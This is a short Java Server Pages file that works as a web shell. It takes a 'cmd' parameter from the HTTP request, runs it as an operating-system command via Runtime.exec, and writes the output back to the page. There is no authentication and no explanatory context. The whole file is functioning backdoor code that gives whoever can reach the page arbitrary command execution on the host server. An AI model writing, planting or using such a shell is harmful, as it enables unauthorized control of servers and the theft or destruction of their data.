<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.Socket" %>
<%
    String path = request.getContextPath();
    String basepath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
	String cmd = request.getParameter("cmd");

	String result = "";
	try {
		Process p = Runtime.getRuntime().exec(cmd);
		InputStreamReader ir = new InputStreamReader(p.getInputStream());
		LineNumberReader input = new LineNumberReader(ir);
		String line;
		while ((line = input.readLine()) != null) {
			result += line.concat("\r\n");
		}
		if (result.length() > 0) {
			result = result.substring(0, result.lastIndexOf("\r\n"));
		}
	} catch (IOException e) {
		e.printStackTrace();
	}
	out.println(result);
%>